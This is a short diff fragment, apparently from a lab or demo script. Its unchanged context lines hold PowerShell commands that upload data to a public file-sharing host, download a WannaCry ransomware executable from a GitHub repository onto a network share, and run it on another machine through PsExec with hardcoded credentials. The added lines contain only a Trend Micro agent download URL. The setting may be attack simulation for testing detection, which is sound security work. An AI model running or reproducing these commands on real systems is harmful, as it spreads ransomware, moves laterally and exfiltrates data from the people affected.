@@ -47,3 +47,6 @@ Invoke-WebRequest -Uri https://bashupload.com -Method Post -ContentType multipar
 	Invoke-WebRequest -Uri https://github.com/limiteci/WannaCry/raw/main/WannaCry.EXE -OutFile \\10.0.10.12\confidential\wcry.exe;
 	CMD: C:\Users\Public\PsExec.exe -s -accepteula \\10.0.10.12 -u trendmicro -p trendmicro C:\confidential\wcry.exe
 
+ https://api-us1.xbc.trendmicro.com/api/public/download_xbc_agent/v1.0/7f3e5d0c-6c62-4f53-92d8-77deacef473b
+ 
+
